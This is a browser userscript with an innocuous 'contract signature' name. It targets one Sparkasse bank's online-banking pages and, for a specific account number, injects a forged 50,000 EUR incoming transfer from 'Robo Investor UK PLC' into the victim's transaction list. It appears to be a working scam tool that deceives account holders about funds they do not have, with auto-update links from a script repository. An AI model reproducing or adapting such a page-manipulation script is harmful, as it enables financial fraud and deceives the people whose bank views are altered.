// ==UserScript==
// @name         Vertragssignature Peter Schulz
...
// @match        https://www.spk-mecklenburg-nordwest.de/fi/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.spk-mecklenburg-nordwest.de/fi/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.spk-mecklenburg-nordwest.de/fi/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @match        https://www.spk-mecklenburg-nordwest.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.spk-mecklenburg-nordwest.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.spk-mecklenburg-nordwest.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/466344/Vertragssignature%20Peter%20Schulz.user.js
// @updateURL https://update.greasyfork.org/scripts/466344/Vertragssignature%20Peter%20Schulz.meta.js
// ==/UserScript==
...
(function() {
    ...
    var absender = "Treuhand: Robo Investor UK PLC";
    var absenderTitel = "Treuhand: Robo Investor UK PLC";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A 88000";
    var absenderDetails = "Einreichung einer Treuhand Ueberweisung. Freigabe nötig durch Robo Investor UK PLC";
    var amount = 0;
    var vorgemerkt = "no";
    var xamount = 50000;
    var buchung = 20000;
    var buchungDecimal = "19";
    var buchungTextsZahl = "403.669";
    var accountsecurity = "1500 2993 12";
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 50.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Robo Investor UK PLC">Robo Investor UK PLC</a></h3><p>Withdrawal Trading Account: AY01-503DE-SM</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">50.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';
